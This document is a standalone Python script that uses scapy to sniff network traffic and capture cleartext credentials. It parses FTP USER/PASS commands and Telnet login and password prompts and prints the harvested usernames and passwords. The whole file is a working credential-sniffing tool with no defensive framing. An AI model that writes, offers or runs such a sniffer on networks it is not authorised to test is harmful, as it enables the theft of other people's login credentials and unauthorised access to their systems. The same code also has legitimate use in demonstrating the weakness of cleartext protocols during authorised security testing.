#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function
import sys
from scapy.all import *
import re
from collections import OrderedDict


def check_packet_detail(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        if packet[TCP].dport == 21 or packet[TCP].sport == 21:
            return 'FTP'
        elif packet[TCP].dport == 23 or packet[TCP].sport == 23:
            return 'Telnet'
        else:
            return False

def capture_ftp(src_ip_port, dst_ip_port, data):
    if 'user' in data.lower() or 'pass' in data.lower():
        if not re.search(r'^[0-9]{3}\s', data):
            cred_type, value = data.split()
            msg = 'FTP %s: %s' % (cred_type, value.replace('\r\n', '').replace('\r', '').replace('\n', ''))
            print("[*] [%s -> %s]  %s" % (src_ip_port, dst_ip_port, msg))
    else:
        return

def capture_telnet(src_ip_port, dst_ip_port, data, ack, seq):
    global telnet_stream
    msg = None

    if src_ip_port in telnet_stream:
        try:
            telnet_stream[src_ip_port] += data.decode('utf8')
        except UnicodeDecodeError:
            pass

        if '\r' in telnet_stream[src_ip_port] or '\n' in telnet_stream[src_ip_port]:
            telnet_split = telnet_stream[src_ip_port].split(' ', 1)
            cred_type = telnet_split[0]
            value = telnet_split[1].replace('\r\n', '').replace('\r', '').replace('\n', '')

            msg = 'Telnet %s: %s' % (cred_type, value)
            print("[*] [%s -> %s]  %s" % (src_ip_port, dst_ip_port, msg))
            del telnet_stream[src_ip_port]

    if len(telnet_stream) > 100:
        telnet_stream.popitem(last=False)
    mod_load = data.lower().strip()
    if mod_load.endswith('username:') or mod_load.endswith('login:'):
        telnet_stream[dst_ip_port] = 'username '
    elif mod_load.endswith('password:'):
        telnet_stream[dst_ip_port] = 'password '


def check_packet(packet):
    app = check_packet_detail(packet)
    if app:
        pass
    else:
        return

    ack = str(packet[TCP].ack)
    seq = str(packet[TCP].seq)
    src_ip_port = str(packet[IP].src) + ':' + str(packet[TCP].sport)
    dst_ip_port = str(packet[IP].dst) + ':' + str(packet[TCP].dport)

    if packet.haslayer(Raw):
        data = packet[Raw].load
        if app == 'FTP':
            capture_ftp(src_ip_port, dst_ip_port, data)
        elif app == 'Telnet':
            capture_telnet(src_ip_port, dst_ip_port, data, ack, seq)

if __name__ == '__main__':
    telnet_stream = OrderedDict()
    print('[*] Sniffing Started ...')

    # try:
    sniff(prn=check_packet, store=0)
    # except Exception:
    #     print('[!] Error: Failed to Initialize Sniffing')
    #     sys.exit(1)

    print('[*] Sniffing Stopped')
